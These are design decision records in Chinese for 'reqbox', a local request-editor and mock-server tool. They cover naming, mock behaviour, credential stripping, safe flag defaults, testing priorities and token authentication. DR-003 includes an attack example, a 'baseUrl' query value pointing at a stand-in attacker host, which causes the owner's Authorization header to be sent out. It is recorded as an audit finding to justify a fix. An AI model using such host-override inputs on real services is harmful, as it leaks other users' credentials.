## DR-001 · 项目命名：定为 `reqbox`

**日期**：2026-10-20 提出，2026-10-21 决定
**状态**：已生效
**关联**：[TODO P1 改名](./TODO.md#p1)

### 背景

项目起初叫 `apimock`，但远端仓库被随手取成了另一个名字，导致项目名、
Go module 与仓库名三者不一致。

### 这个工具到底是什么

不是通用的 API 测试客户端。它的形态是：

> 一个本地运行的单二进制服务，用 SQLite 保存请求定义，在浏览器里编辑并
> 执行，并把任意一条已保存的请求「再发布」成一个可供他人调用的 mock 端点。

两个特征决定了命名方向：

1. **本地自持** —— 一个可执行文件 + 一个 SQLite 文件，无账号、无云端。
2. **一物两用** —— 同一份定义既是我调试用的请求，也是对外提供的端点。

因此「API client」这个词不够准确，它漏掉了第二点（发布）。而单纯叫
「Mock server」又漏掉了第一点（我自己的请求集合与历史）。

### 决定

**统一为 `reqbox`**：Go module、二进制、环境变量、数据路径、前端存储键、
UI 文案全部改到位，老数据通过回退逻辑自动沿用（见 TODO 的改名记录）。

### 理由

- 直指 request，与 UI 的 Requests 一致，短、好拼、终端里好敲。
- 没有在任何生态里发现同类占用（pkg.go.dev / npm / GitHub 均核查）。
- 现在没有外部使用者，是改名的最后窗口；再晚成本会显著上升。

### 被否决的候选

用 pkg.go.dev、npm、GitHub API 与网页搜索实际查证过，不是凭印象：

| 候选 | 结果 |
| ---- | ---- |
| `patchbay` / `shunt` / `spigot` | 已被 Go 生态大量占用 |
| `apibench` / `apiforge` / `airlock` / `apibay` | 已有同名产品，其中 airlock 定位几乎重复 |
| `hatchbox` | 未占用，但不如 reqbox 贴切 |
| `FetApi` | `Fetapi` 是真实姓氏，GitHub 上多个个人仓库挤占搜索结果；且 Go module 路径必须全小写，`FetApi` 会被静默改写为 `fetapi`（实测 `case-insensitive import collision`） |
| `SuperGet` | **是 Getnet（桑坦德集团）的注册品牌**，Google Play 有同名支付应用；且未表达「本地保存」与「可发布 mock」两个特征 |

### 什么情况下重新考虑

若将来加上 Proxy / 透传模式，名字可能需要体现「代理」而非「请求」。
除此之外，改名已完成，不再重新评估。

## DR-002 · Mock 采用实时执行而非缓存回放

**日期**：2026-10-20
**状态**：已生效

### 背景

Mock 端点可以选择「缓存一份响应固定返回」，也可以「每次实时请求上游再返回」。

### 决定

实时执行。

### 理由

- 与「保存的请求」语义一致：用户点发布时，期望的是「让别人也能跑这个请求」，
  而不是「让别人拿到我上次的快照」。
- 上游数据变化时无需重新发布，适合联调阶段。
- 代价是：上游不可用时 mock 也不可用。已在 README 的 Known limits 写明。

### 什么情况下重新考虑

需要「快照固定值」的场景（如演示、离线环境、上游不稳定）。届时更合适的
做法是增加一个模式开关，而不是改掉现有行为。

## DR-003 · 发布 mock 时剥离凭证的触发条件

**日期**：2026-10-20
**状态**：已生效

### 背景

Mock 的 query 参数可以填充 `{{placeholder}}`，包括被用作主机名的那个。
审计时发现：调用方传 `?baseUrl=https://攻击者.example` 就能让请求带着
**所有者保存的 Authorization 头**发到对方服务器。

### 决定

比较「应用调用方变量之前」与「之后」的 URL origin（scheme + host）：

- 未变化 → 正常附带凭证（保留原有功能）；
- 变化 → 剥离 `authType`、`auth`、`headers`。

### 理由

选「origin 变化时剥离」而不是「一律禁止覆盖主机」：

- 后者会让「用不同测试环境指向同一 mock」这种正当用法失效；
- 前者精确对应威胁模型：**凭证的存在前提是「发往我自己配置的地方」**。

### 什么情况下重新考虑

若将来支持显式的「多上游」配置，应改为白名单校验而非一律剥离。

## DR-004 · 安全标志缺省为安全值

**日期**：2026-10-20
**状态**：已生效

### 背景

`execOptions` 原先用普通 `bool` 表示 `verifyTls` / `followRedirects`。
Go 的 JSON 解码把缺失字段留为零值 `false`，于是「客户端只传了 timeout」
会被理解为「关闭 TLS 校验」。审计时用自签名服务器复现：不带该字段能拿到
响应体，显式 `true` 才报证书错误。

### 决定

改用 `*bool`，缺失时保留安全默认（校验 TLS、跟随重定向）；只有显式
`false` 才关闭。

### 理由

「不传」与「明确要求关闭」是两件事，必须可区分。
默认值应取安全侧，让关闭成为一个需要主动表达的决定。

### 什么情况下重新考虑

不适用 —— 这是应当长期保持的原则，其他新增的布尔安全开关也应照此办理。

## DR-005 · 把前端自动化测试提到功能开发之前

**日期**：2026-10-21
**状态**：已决定
**关联**：[TODO P2 前端自动化测试](./TODO.md)

### 背景

项目推进到现在，发生过多次「改 A 弄坏 B」，且大多不是立刻能发现的：

| 回退 | 是如何被发现的 |
| ---- | -------------- |
| 标签选中态从未生效（下划线 0px / 0 宽） | 用户指出「选中没高亮」 |
| 重组标签时丢失 Received 时间与 Cookies 列表 | 核对文档时才察觉 |
| 切换请求后响应区残留上一个请求的结果 | 使用中察觉 |
| 失败时 URL 显示未解析的 `{{变量}}` | 专项审计时才挖出 |

共同点：**`tsc` 与 lint 都通过，手工验证新功能也通过**，坏掉的是旧行为。

### 决定

将前端自动化测试从「P2 技术债」提升为功能开发的前置项，排在多语言与
阶段耗时之前。预算 1.5 ～ 2 天。

### 理由

- 现有验证手段只能确认「新功能对不对」，无法发现「旧功能有没有坏」。
  本轮 Cookies 丢失正是这种沉默回归。
- 项目已积累 43 个请求、多个界面区域（侧栏、请求编辑、响应区、对话框），
  手工回归成本随功能增长而线性上升。
- 相较之下，SSE / WebSocket 等新功能属于「加东西」，晚做不影响正确性；
  而缺少回归保护会让每次改动都承担隐性风险。

### 范围界定

不求覆盖率，只覆盖主流程与高频交互：「新建 → 保存 → 发送 → 发布」，
以及响应区标签切换、空响应、失败响应三种渲染路径。

### 什么情况下重新考虑

若前端结构发生大改（如引入路由、拆分为多页面），测试的投入产出需重新评估；
届时优先保证主流程仍被覆盖，而非追求用例数量。

## DR-006 · API 鉴权采用「启动生成 token + cookie 交换」而非文件权限

**日期**：2026-10-21
**状态**：已生效

### 背景

审计发现 `GET /api/requests` 无需任何凭据就返回明文 Bearer token。
原计划（方案 A）是「收紧数据库文件权限 + UI 提示」，但实测发现：

- `os.Chmod(path, 0600)` 在 Windows 上只切换只读位，**不设 ACL**。
  实测 `mode after chmod(0600) = -rw-rw-rw-`，而实际部署目标是
  Windows Server 2012 R2。
- 数据库文件原本的 ACL 允许 `BUILTIN\Users` 读取、`Authenticated Users` 修改。
- 更严重的是网络侧：默认监听 `:5178`（所有网卡），任何能访问端口的人
  都能直接读走全部凭据。

文件权限只防「同机其他用户」，防不住「同网段任何人」，后者风险高一个量级。

### 决定

采用 **token 鉴权**，并用**真正的平台 API** 收紧文件权限，两者互补：

1. 首次启动生成 32 字节 `crypto/rand` token（base64url），打印一次。
2. 数据库只存 **SHA-256 哈希**，比对用 `subtle.ConstantTimeCompare`。
3. 浏览器通过 `/?token=…` 一次性交换 `HttpOnly; SameSite=Strict` cookie，
   随后 302 到 `/` 把 token 从地址栏抹掉。
4. 同时接受 `Authorization: Bearer …`，供 curl 与脚本使用。
5. 启动时用 `golang.org/x/sys/windows` 的 `SetNamedSecurityInfo` 设置 DACL：
   仅当前用户 + SYSTEM + Administrators。目录用可继承 ACE，使 SQLite 自己
   创建的 `-wal` / `-shm` 也继承受限权限。
6. `-no-auth` 可关闭校验，但会打印警告；`-token` 可指定固定值（容器场景）。

### 理由

- **token 防的是「谁能访问」**，这是主要威胁面；文件权限防的是
  「同机其他账户直接读文件」，次要但真实。
- Chrome 之外的手动调用（curl）用 header，浏览器用 cookie：
  浏览器无法自动附加 `Authorization`，所以 cookie 是必需品而非可选项。
- token 只存哈希：为了「不把凭据明文落盘」而把 token 明文存进同一个库，
  是自相矛盾的。
- cookie 值就是那个哈希，不是新凭据：一个值只有一个轮换点。

### 未采用

- **每次启动换 token**：重启会踢掉所有会话，用户会干脆用 `-no-auth` 绕过。
  改为「首次生成后存哈希复用」，`-token` 用于主动轮换。
- **回环地址豁免**：同机其他用户同样能访问 `127.0.0.1`，豁免等于对这批人敞开。
- **UI 弹窗式解锁**：没有 token 时没有工作区可显示，弹窗后面的空壳会让人
  以为程序坏了。改为整屏解锁页。

### 什么情况下重新考虑

- 若需要多用户/多租户，token 不够用，应引入真正的账号体系。
- 若要在不受信网络暴露，应在前面加 TLS 终结（token 是 bearer 凭据，
  明文 HTTP 下可被嗅探）。
- 加密落盘（方案 B）仍待决策：目前防住了「谁文件」，没防「读到文件之后」。
